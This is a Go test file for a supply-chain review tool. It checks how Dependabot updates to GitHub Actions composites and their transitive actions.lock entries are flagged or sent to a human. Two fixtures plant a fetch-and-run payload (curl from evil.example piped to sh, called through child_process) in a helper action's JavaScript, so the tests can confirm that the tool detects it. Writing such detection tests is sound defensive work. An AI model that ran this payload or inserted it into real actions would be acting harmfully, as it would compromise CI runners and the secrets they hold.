package actions

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sadbox/dep-review/internal/fetch"
	"github.com/sadbox/dep-review/internal/model"
	"github.com/sadbox/dep-review/internal/policy"
)

// repoAPI is the fake REST view of one upstream action repository with
// two tagged release commits.
func repoAPI(r map[string]any, nwo string, id, ownerID int, old, new, oldTag, newTag string) {
	p := "repos/" + nwo
	ref := func(name, sha string) obj {
		return obj{"ref": "refs/tags/" + name, "object": obj{"sha": sha, "type": "commit"}}
	}
	r[p] = obj{"id": id, "full_name": nwo, "default_branch": "main", "owner": obj{"id": ownerID}}
	r[p+"/compare/main..."+new+"?per_page=1"] = obj{"status": "behind"}
	r[p+"/compare/"+old+"..."+new+"?per_page=100"] = obj{"status": "ahead", "ahead_by": 1, "total_commits": 1,
		"commits": []obj{{"sha": new, "commit": obj{"message": "release", "author": obj{"name": "Dev"}}, "author": obj{"login": "dev"}}}}
	r[p+"/git/matching-refs/tags/v"] = []obj{ref(oldTag, old), ref(newTag, new)}
	r[p+"/releases/tags/"+oldTag] = obj{"tag_name": oldTag, "author": obj{"login": "dev"}}
	r[p+"/releases/tags/"+newTag] = obj{"tag_name": newTag, "author": obj{"login": "dev"}}
	r["advisories?ecosystem=actions&per_page=100&affects="+strings.ReplaceAll(nwo, "/", "%2F")+"%40"+strings.TrimPrefix(newTag, "v")] = []obj{}
	r[p+"/git/commits/"+old] = obj{"verification": obj{"verified": true, "reason": "valid"}}
	r[p+"/git/commits/"+new] = obj{"verification": obj{"verified": true, "reason": "valid"}}
	r[p+"/branches?per_page=100"] = []obj{}
}

type transScenario struct {
	name    string
	helper2 func(map[string]string) // edits acme/helper's v2.0.1 tree
	// sub: the composite runs acme/helper/<sub> instead of the root;
	// directHelper: the workflow also bumps acme/helper (the root) itself.
	sub          string
	directHelper bool
	// actNewStep replaces the uses: value of act 1.0.1's step ("" for a
	// run: step), given the new helper commit.
	actNewStep func(h2 string) *string
	// actOldStep and lockOld do the same for act 1.0.0 and the base lockfile.
	actOldStep func(h1 string) string
	lockOld    func(a1, h1 string) string
	// lockNew replaces the head lockfile, built with lock(actTag, act, helperTag, helper).
	lockNew  func(lock func(string, string, string, string) string, a2, h1, h2 string) string
	api      func(r map[string]any, h1, h2 string)
	want     model.Route
	codes    []string
	notCodes []string
	check    func(t *testing.T, res fetch.Result, ev *memEvidence)
}

// runTransitive: acme/act is a composite whose step uses acme/helper (a
// node action). The PR bumps act 1.0.0 -> 1.0.1, and act 1.0.1 moves its
// step from helper 2.0.0 to 2.0.1, so actions.lock has a transitive pair.
func runTransitive(t *testing.T, sc transScenario) {
	root := t.TempDir()
	mkUp := func(nwo string) string {
		d := filepath.Join(root, "upstream", filepath.FromSlash(nwo))
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		gitIn(t, d, "init", "-q")
		return d
	}
	hd := mkUp("acme/helper")
	f1, f2 := v1Files(), v2Files()
	if sc.sub != "" {
		f1[sc.sub+"/action.yml"] = "name: sub\ndescription: sub action\nruns:\n  using: node24\n  main: ../dist/index.js\n"
		f2[sc.sub+"/action.yml"] = f1[sc.sub+"/action.yml"]
	}
	if sc.helper2 != nil {
		sc.helper2(f2)
	}
	h1 := commitTree(t, hd, f1, "v2.0.0")
	h2 := commitTree(t, hd, f2, "v2.0.1")
	composite := func(ref string) map[string]string {
		path := "acme/helper"
		if sc.sub != "" {
			path += "/" + sc.sub
		}
		return map[string]string{"action.yml": "name: act\ndescription: composite\nruns:\n  using: composite\n  steps:\n    - uses: " + path + "@" + ref + "\n"}
	}
	ad := mkUp("acme/act")
	actOld := composite("v2.0.0")
	if sc.actOldStep != nil {
		actOld["action.yml"] = "name: act\ndescription: composite\nruns:\n  using: composite\n  steps:\n    - uses: " + sc.actOldStep(h1) + "\n"
	}
	a1 := commitTree(t, ad, actOld, "v1.0.0")
	actNew := composite("v2.0.1")
	if sc.actNewStep != nil {
		switch u := sc.actNewStep(h2); {
		case u == nil:
			actNew["action.yml"] = "name: act\ndescription: composite\nruns:\n  using: composite\n  steps:\n    - run: echo\n      shell: bash\n"
		default:
			actNew["action.yml"] = "name: act\ndescription: composite\nruns:\n  using: composite\n  steps:\n    - uses: " + *u + "\n"
		}
	}
	a2 := commitTree(t, ad, actNew, "v1.0.1")

	lock := func(actTag, act, helperTag, helper string) string {
		list := "        - 'acme/act@" + actTag + "'\n"
		if sc.directHelper {
			list += "        - 'acme/helper@" + helperTag + "'\n"
		}
		return "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n" + list + "dependencies:\n" +
			"    'acme/act@" + actTag + "':\n        ref: '" + actTag + "'\n        commit: 'sha1-" + act + "'\n        owner_id: 1\n        repo_id: 2\n        uses:\n            - 'acme/helper@" + helperTag + "'\n" +
			"    'acme/helper@" + helperTag + "':\n        ref: '" + helperTag + "'\n        commit: 'sha1-" + helper + "'\n        owner_id: 1\n        repo_id: 3\n"
	}
	wfText := func(tag string) string {
		w := "name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-26.04\n    steps:\n      - uses: acme/act@" + tag + "\n"
		if sc.directHelper {
			w += "      - uses: acme/helper@" + map[string]string{"v1.0.0": "v2.0.0", "v1.0.1": "v2.0.1"}[tag] + "\n"
		}
		return w
	}
	newLock := lock("v1.0.1", a2, "v2.0.1", h2)
	if sc.lockNew != nil {
		newLock = sc.lockNew(lock, a2, h1, h2)
	}
	caller := filepath.Join(root, "caller")
	if err := os.MkdirAll(caller, 0o755); err != nil {
		t.Fatal(err)
	}
	gitIn(t, caller, "init", "-q")
	oldLock := lock("v1.0.0", a1, "v2.0.0", h1)
	if sc.lockOld != nil {
		oldLock = sc.lockOld(a1, h1)
	}
	base := commitTree(t, caller, map[string]string{".github/workflows/ci.yml": wfText("v1.0.0"), ".github/workflows/actions.lock": oldLock}, "base")
	head := commitTree(t, caller, map[string]string{".github/workflows/ci.yml": wfText("v1.0.1"), ".github/workflows/actions.lock": newLock}, "dependabot")

	api := map[string]any{}
	repoAPI(api, "acme/act", 2, 1, a1, a2, "v1.0.0", "v1.0.1")
	repoAPI(api, "acme/helper", 3, 1, h1, h2, "v2.0.0", "v2.0.1")
	if sc.api != nil {
		sc.api(api, h1, h2)
	}
	ev := &memEvidence{}
	res, err := New(Config{CloneBase: "file://" + filepath.Join(root, "upstream") + "/"}).Fetch(context.Background(), fetch.Env{
		Class:   model.Classification{Repo: "me/caller", BaseSHA: base, HeadSHA: head, Ecosystem: model.GitHubActions},
		RepoDir: caller, Scratch: filepath.Join(root, "scratch"), Evidence: ev, GitHub: &fakeGH{resp: api},
	})
	if err != nil {
		t.Fatal(err)
	}
	// Through CompareDeclared as fetch.Run does: Dependabot declares only act.
	declared := []model.Update{{Name: "acme/act", From: "1.0.0", To: "1.0.1"}}
	if sc.directHelper {
		declared = append(declared, model.Update{Name: "acme/helper", From: "2.0.0", To: "2.0.1"})
	}
	updates, dfs := fetch.CompareDeclared(model.GitHubActions, declared, res.Updates)
	all := append(append([]model.Finding(nil), res.Findings...), dfs...)
	got := policy.Combine(updates, all, false)
	codes := map[string]bool{}
	var lines []string
	for _, x := range all {
		codes[x.Code] = true
		lines = append(lines, string(x.Route)+" "+x.Code+": "+x.Detail)
	}
	t.Logf("route %s\n%s", got, strings.Join(lines, "\n"))
	if got != sc.want {
		t.Errorf("route %s, want %s\n%s", got, sc.want, strings.Join(lines, "\n"))
	}
	for _, c := range sc.codes {
		if !codes[c] {
			t.Errorf("missing finding %s\n%s", c, strings.Join(lines, "\n"))
		}
	}
	for _, c := range sc.notCodes {
		if codes[c] {
			t.Errorf("unexpected finding %s\n%s", c, strings.Join(lines, "\n"))
		}
	}
	if sc.check != nil {
		sc.check(t, res, ev)
	}
}

func TestFetchTransitive(t *testing.T) {
	scenarios := []transScenario{
		{name: "composite bump with a clean transitive bump", want: model.RouteReview,
			codes:    []string{"actions.nested-uses-locked", CodeRebuildNotRun},
			notCodes: []string{"actions.nested-uses-changed", "actions.lock-transitive-changed", "undeclared.update"},
			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
				if len(res.Updates) != 2 || !res.Updates[0].Direct || res.Updates[1].Direct ||
					res.Updates[1].Name != "acme/helper" || res.Updates[1].From != "2.0.0" || res.Updates[1].To != "2.0.1" {
					t.Errorf("updates %+v", res.Updates)
				}
				var transitive []string
				for _, n := range ev.names() {
					if strings.HasPrefix(n, "actions/transitive/acme__helper/") {
						transitive = append(transitive, n)
						if strings.Contains(n, ".diff/D") {
							continue // a navigable part: listed by its index, not in Files
						}
						if !strings.Contains(ev.files[n].desc, "transitive, actions.lock acme/act@v1.0.1 > acme/helper@v2.0.1") {
							t.Errorf("%s: description %q", n, ev.files[n].desc)
						}
					}
				}
				if len(transitive) == 0 {
					t.Errorf("no transitive evidence: %v", ev.names())
				}
				// The first-party source is navigable: one required part
				// per changed file, each written under its index.
				if len(res.Diffs) == 0 {
					t.Error("no navigable source diffs")
				}
				for _, d := range res.Diffs {
					if _, ok := ev.files[d.File]; !d.Required || d.ID == "" || !ok {
						t.Errorf("diff %+v: not required, unnamed or not written", d)
					}
				}
				for _, x := range res.Findings {
					if x.Update == "acme/helper" && !strings.HasPrefix(x.Detail, "transitive (actions.lock acme/act@v1.0.1 > acme/helper@v2.0.1): ") {
						t.Errorf("transitive finding not labelled: %s", x.Detail)
					}
				}
				if s := string(ev.files["actions/summary.md"].content); !strings.Contains(s, "## transitive acme/helper") {
					t.Errorf("summary lacks the transitive pair:\n%s", s)
				}
			}},
		{name: "transitive bump with an unexplained dist change", want: model.RouteHuman,
			codes:    []string{"actions.dist-residual", "actions.nested-uses-changed"},
			notCodes: []string{"actions.nested-uses-locked"},
			helper2: func(f map[string]string) {
				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
			}},
		{name: "transitive commit is not the tag's", want: model.RouteRefuse, codes: []string{"actions.lock-tag-mismatch"},
			api: func(r map[string]any, h1, h2 string) {
				r["repos/acme/helper/git/matching-refs/tags/v"] = []obj{
					{"ref": "refs/tags/v2.0.0", "object": obj{"sha": h1, "type": "commit"}},
					{"ref": "refs/tags/v2.0.1", "object": obj{"sha": "abababababababababababababababababababab", "type": "commit"}},
					{"ref": "refs/tags/v2.0.2", "object": obj{"sha": h2, "type": "commit"}}}
				r["repos/acme/helper/releases/tags/v2.0.2"] = obj{"tag_name": "v2.0.2"}
				r["advisories?ecosystem=actions&per_page=100&affects=acme%2Fhelper%402.0.2"] = []obj{}
			}},
		{name: "transitive commit only in a fork", want: model.RouteRefuse, codes: []string{"actions.not-on-default-branch"},
			api: func(r map[string]any, h1, h2 string) {
				r["repos/acme/helper/compare/main..."+h2+"?per_page=1"] = obj{"status": "diverged"}
			}},
		{name: "transitive entry names another repository", want: model.RouteRefuse, codes: []string{"actions.lock-identity-mismatch"},
			api: func(r map[string]any, h1, h2 string) {
				r["repos/acme/helper"].(obj)["id"] = 99
			}},
		{name: "nested change the lockfile does not record", want: model.RouteHuman,
			codes:    []string{"actions.nested-uses-changed"},
			notCodes: []string{"actions.nested-uses-locked"},
			// act 1.0.1's entry keeps helper 2.0.0, but act's action.yml
			// now uses 2.0.1: no transitive pair explains it.
			lockNew: func(lock func(string, string, string, string) string, a2, h1, h2 string) string {
				return lock("v1.0.1", a2, "v2.0.0", h1)
			}},
	}
	// The workflow bumps acme/helper (its root action) and the composite
	// runs acme/helper/sub over the same commits: the bump's analysis read
	// only the root action.yml, so it cannot explain the sub action.
	subPost := func(f map[string]string) { f["sub/action.yml"] += "  post: ../dist/index.js\n" }
	// The composite pins acme/helper by SHA (lockfile key helper@<sha>)
	// while the workflow bumps acme/helper@v2.0.1 to the same commit: the
	// transitive pair merges into the bump, but its own entry (ref, IDs)
	// must still be checked.
	shaLock := func(ref, repoID string) func(func(string, string, string, string) string, string, string, string) string {
		return func(_ func(string, string, string, string) string, a2, h1, h2 string) string {
			return "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n        - 'acme/act@v1.0.1'\n        - 'acme/helper@v2.0.1'\ndependencies:\n" +
				"    'acme/act@v1.0.1':\n        ref: 'v1.0.1'\n        commit: 'sha1-" + a2 + "'\n        owner_id: 1\n        repo_id: 2\n        uses:\n            - 'acme/helper@" + h2 + "'\n" +
				"    'acme/helper@" + h2 + "':\n        ref: '" + ref + "'\n        commit: 'sha1-" + h2 + "'\n        owner_id: 1\n        repo_id: " + repoID + "\n" +
				"    'acme/helper@v2.0.1':\n        ref: 'v2.0.1'\n        commit: 'sha1-" + h2 + "'\n        owner_id: 1\n        repo_id: 3\n"
		}
	}
	shaStep := func(h2 string) *string { u := "acme/helper@" + h2; return &u }
	scenarios = append(scenarios,
		transScenario{name: "same range, other subpath, clean", sub: "sub", directHelper: true, want: model.RouteReview,
			codes: []string{"actions.nested-uses-locked"}, notCodes: []string{"actions.nested-uses-changed"},
			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
				var tagged bool
				for _, n := range ev.names() {
					tagged = tagged || (strings.HasPrefix(n, "actions/transitive/acme__helper/") && strings.Contains(n, "-sub"))
				}
				if !tagged {
					t.Errorf("sub action not analyzed as its own pair: %v", ev.names())
				}
			}},
		transScenario{name: "same range, other subpath gains a post hook", sub: "sub", directHelper: true, helper2: subPost, want: model.RouteHuman,
			codes: []string{"actions.entrypoint-added", "actions.nested-uses-changed"}, notCodes: []string{"actions.nested-uses-locked"}},
		transScenario{name: "merged pair, its own entry checks out", directHelper: true, actNewStep: shaStep, lockNew: shaLock("v2.0.1", "3"), want: model.RouteReview,
			codes: []string{"actions.nested-uses-locked"}},
		transScenario{name: "merged pair records a tag not on the commit", directHelper: true, actNewStep: shaStep, lockNew: shaLock("v2.0.9", "3"), want: model.RouteRefuse,
			codes: []string{"actions.lock-tag-mismatch"}},
		transScenario{name: "merged pair records another repository", directHelper: true, actNewStep: shaStep, lockNew: shaLock("v2.0.1", "99"), want: model.RouteRefuse,
			codes: []string{"actions.lock-identity-mismatch"}},
		// The composite pinned acme/helper by SHA, recorded as v1.9.9, which
		// is not a tag on that commit: the merged pair's old entry must
		// have its exact tag checked as the bump's was.
		transScenario{name: "merged pair's old entry records a moved tag", directHelper: true,
			actOldStep: func(h1 string) string { return "acme/helper@" + h1 },
			lockOld: func(a1, h1 string) string {
				return "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n        - 'acme/act@v1.0.0'\n        - 'acme/helper@v2.0.0'\ndependencies:\n" +
					"    'acme/act@v1.0.0':\n        ref: 'v1.0.0'\n        commit: 'sha1-" + a1 + "'\n        owner_id: 1\n        repo_id: 2\n        uses:\n            - 'acme/helper@" + h1 + "'\n" +
					"    'acme/helper@" + h1 + "':\n        ref: 'v1.9.9'\n        commit: 'sha1-" + h1 + "'\n        owner_id: 1\n        repo_id: 3\n" +
					"    'acme/helper@v2.0.0':\n        ref: 'v2.0.0'\n        commit: 'sha1-" + h1 + "'\n        owner_id: 1\n        repo_id: 3\n"
			},
			want: model.RouteHuman, codes: []string{"actions.lock-old-tag-moved"}},
		// act 1.0.1's entry still lists acme/helper, but its action.yml no
		// longer runs it: the merged pair has no subpath to analyze.
		transScenario{name: "merged pair the parent does not run", directHelper: true, actNewStep: func(string) *string { return nil }, want: model.RouteHuman,
			codes: []string{"actions.lock-transitive-unanalyzed"}},
	)
	for _, sc := range scenarios {
		t.Run(sc.name, func(t *testing.T) {
			t.Parallel()
			runTransitive(t, sc)
		})
	}
}

// lockedComposite is acme/act (a composite whose one step runs acme/helper)
// bumped 1.0.0 -> 1.0.1 in an onboarded workflow, with acme/helper's trees,
// the composite's step at each version, the helper keys the two lockfiles
// record and the tags upstream has on the two helper commits now.
type lockedComposite struct {
	helper1, helper2 map[string]string
	actOld, actNew   string            // the composite step's uses: value
	actNewExtra      map[string]string // extra files in act 1.0.1
	oldHelperKey     string            // helper ref in the base lockfile
	newHelperKey     string            // helper ref in the head lockfile
	helperTags       [2]string         // upstream tags on the old, new helper commit
	api              func(r map[string]any, h1, h2 string)
}

func runLockedComposite(t *testing.T, sc lockedComposite) (model.Route, map[string]bool) {
	t.Helper()
	root := t.TempDir()
	mkUp := func(nwo string) string {
		d := filepath.Join(root, "upstream", filepath.FromSlash(nwo))
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		gitIn(t, d, "init", "-q")
		return d
	}
	hd := mkUp("acme/helper")
	h1 := commitTree(t, hd, sc.helper1, "h1")
	h2 := commitTree(t, hd, sc.helper2, "h2")
	ad := mkUp("acme/act")
	comp := func(u string) map[string]string {
		return map[string]string{"action.yml": "name: act\ndescription: composite\nruns:\n  using: composite\n  steps:\n    - uses: " + u + "\n"}
	}
	// "{h1}" in actOld or oldHelperKey stands for the old helper commit.
	sc.actOld = strings.ReplaceAll(sc.actOld, "{h1}", h1)
	sc.oldHelperKey = strings.ReplaceAll(sc.oldHelperKey, "{h1}", h1)
	a1 := commitTree(t, ad, comp(sc.actOld), "v1.0.0")
	f2 := comp(sc.actNew)
	for k, v := range sc.actNewExtra {
		f2[k] = v
	}
	a2 := commitTree(t, ad, f2, "v1.0.1")
	lock := func(actTag, act, helperKey, helper string) string {
		return "version: 'v0.0.3'\nworkflows:\n    '.github/workflows/ci.yml':\n        - 'acme/act@" + actTag + "'\ndependencies:\n" +
			"    'acme/act@" + actTag + "':\n        ref: '" + actTag + "'\n        commit: 'sha1-" + act + "'\n        owner_id: 1\n        repo_id: 2\n        uses:\n            - 'acme/helper@" + helperKey + "'\n" +
			"    'acme/helper@" + helperKey + "':\n        ref: '" + helperKey + "'\n        commit: 'sha1-" + helper + "'\n        owner_id: 1\n        repo_id: 3\n"
	}
	wf := func(tag string) string {
		return "name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-26.04\n    steps:\n      - uses: acme/act@" + tag + "\n"
	}
	caller := filepath.Join(root, "caller")
	if err := os.MkdirAll(caller, 0o755); err != nil {
		t.Fatal(err)
	}
	gitIn(t, caller, "init", "-q")
	base := commitTree(t, caller, map[string]string{".github/workflows/ci.yml": wf("v1.0.0"), ".github/workflows/actions.lock": lock("v1.0.0", a1, sc.oldHelperKey, h1)}, "base")
	head := commitTree(t, caller, map[string]string{".github/workflows/ci.yml": wf("v1.0.1"), ".github/workflows/actions.lock": lock("v1.0.1", a2, sc.newHelperKey, h2)}, "dependabot")

	api := map[string]any{}
	repoAPI(api, "acme/act", 2, 1, a1, a2, "v1.0.0", "v1.0.1")
	repoAPI(api, "acme/helper", 3, 1, h1, h2, sc.helperTags[0], sc.helperTags[1])
	if sc.api != nil {
		sc.api(api, h1, h2)
	}
	res, err := New(Config{CloneBase: "file://" + filepath.Join(root, "upstream") + "/"}).Fetch(context.Background(), fetch.Env{
		Class:   model.Classification{Repo: "me/caller", BaseSHA: base, HeadSHA: head, Ecosystem: model.GitHubActions},
		RepoDir: caller, Scratch: filepath.Join(root, "scratch"), Evidence: &memEvidence{}, GitHub: &fakeGH{resp: api},
	})
	if err != nil {
		t.Fatal(err)
	}
	updates, dfs := fetch.CompareDeclared(model.GitHubActions, []model.Update{{Name: "acme/act", From: "1.0.0", To: "1.0.1"}}, res.Updates)
	all := append(append([]model.Finding(nil), res.Findings...), dfs...)
	got := policy.Combine(updates, all, false)
	codes := map[string]bool{}
	for _, x := range all {
		codes[x.Code] = true
		t.Logf("%s %s [%s]: %s", x.Route, x.Code, x.Update, x.Detail)
	}
	return got, codes
}

// The composite switches from acme/helper (the root) to acme/helper/evil,
// a subpath it never ran. evil/ is unchanged between the helper commits
// (already malicious at the old one), so its diff is empty: there is no
// baseline, and the switch must reach a human.
func TestFetchTransitiveNewSubpath(t *testing.T) {
	evil := func(f map[string]string) map[string]string {
		f["evil/action.yml"] = "name: evil\ndescription: x\nruns:\n  using: node24\n  main: ../dist/evil.js\n"
		f["dist/evil.js"] = "require('child_process').execSync('curl https://evil.example | sh');\n"
		return f
	}
	got, codes := runLockedComposite(t, lockedComposite{
		helper1: evil(v1Files()), helper2: evil(v2Files()),
		actOld: "acme/helper@v2.0.0", actNew: "acme/helper/evil@v2.0.1",
		oldHelperKey: "v2.0.0", newHelperKey: "v2.0.1", helperTags: [2]string{"v2.0.0", "v2.0.1"},
	})
	if model.Worse(got, model.RouteHuman) != got || !codes["actions.lock-transitive-new-subpath"] || codes["actions.nested-uses-locked"] {
		t.Errorf("route %s, codes %v: a subpath the composite never ran reached review", got, codes)
	}
}

// Upstream moves the release tag acme/helper@v2.0.5 to another commit (the
// tj-actions pattern) and gh-actions-lock re-resolves the unchanged key.
// That is not a bump: it must reach a human as a moved entry.
func TestFetchTransitiveMovedTag(t *testing.T) {
	got, codes := runLockedComposite(t, lockedComposite{
		helper1: v1Files(), helper2: v2Files(),
		actOld: "acme/helper@v2.0.5", actNew: "acme/helper@v2.0.5",
		actNewExtra:  map[string]string{"README.md": "act 1.0.1\n"},
		oldHelperKey: "v2.0.5", newHelperKey: "v2.0.5",
		helperTags: [2]string{"v2.0.4", "v2.0.5"}, // v2.0.5 now names the new commit
	})
	if model.Worse(got, model.RouteHuman) != got || !codes["actions.lock-entry-moved"] {
		t.Errorf("route %s, codes %v: a moved transitive tag did not reach a human", got, codes)
	}
}

// A transitive pair's floating old ref (acme/helper@v2) anchors its old
// version: upstream adding v3.0.0 to the old commit must not turn the
// v2 -> v3.1.0 major bump into a 3.0.0 -> 3.1.0 minor.
func TestFetchTransitiveFloatingOldRef(t *testing.T) {
	ref := func(n, sha string) obj {
		return obj{"ref": "refs/tags/" + n, "object": obj{"sha": sha, "type": "commit"}}
	}
	for _, tc := range []struct {
		name  string
		extra bool
	}{{"control", false}, {"extra v3.0.0 on the old commit", true}} {
		t.Run(tc.name, func(t *testing.T) {
			sc := lockedComposite{
				helper1: v1Files(), helper2: v2Files(),
				actOld: "acme/helper@v2", actNew: "acme/helper@v3.1.0",
				oldHelperKey: "v2", newHelperKey: "v3.1.0", helperTags: [2]string{"v2.5.0", "v3.1.0"},
			}
			if tc.extra {
				sc.api = func(r map[string]any, h1, h2 string) {
					r["repos/acme/helper/git/matching-refs/tags/v"] = []obj{ref("v2.5.0", h1), ref("v3.0.0", h1), ref("v3.1.0", h2)}
				}
			}
			if got, codes := runLockedComposite(t, sc); got != model.RouteHuman {
				t.Errorf("route %s (%v): a v2 -> v3.1.0 major transitive bump did not reach a human", got, codes)
			}
		})
	}
}

// A transitive pair whose old ref is not a version (a SHA key) has an old
// version only when the old commit carries exactly one vX.Y.Z tag.
func TestFetchTransitiveUnanchoredOldRef(t *testing.T) {
	ref := func(n, sha string) obj {
		return obj{"ref": "refs/tags/" + n, "object": obj{"sha": sha, "type": "commit"}}
	}
	for _, tc := range []struct {
		name string
		two  bool
		want model.Route
	}{{"one tag on the old commit", false, model.RouteReview}, {"two tags on the old commit", true, model.RouteHuman}} {
		t.Run(tc.name, func(t *testing.T) {
			sc := lockedComposite{
				helper1: v1Files(), helper2: v2Files(),
				actOld: "acme/helper@{h1}", actNew: "acme/helper@v2.0.1",
				oldHelperKey: "{h1}", newHelperKey: "v2.0.1", helperTags: [2]string{"v2.0.0", "v2.0.1"},
			}
			if tc.two {
				sc.api = func(r map[string]any, h1, h2 string) {
					r["repos/acme/helper/git/matching-refs/tags/v"] = []obj{ref("v1.0.0", h1), ref("v2.0.0", h1), ref("v2.0.1", h2)}
				}
			}
			got, codes := runLockedComposite(t, sc)
			if got != tc.want || (tc.two && !codes["actions.lock-old-version-unanchored"]) {
				t.Errorf("route %s, want %s (%v)", got, tc.want, codes)
			}
		})
	}
}
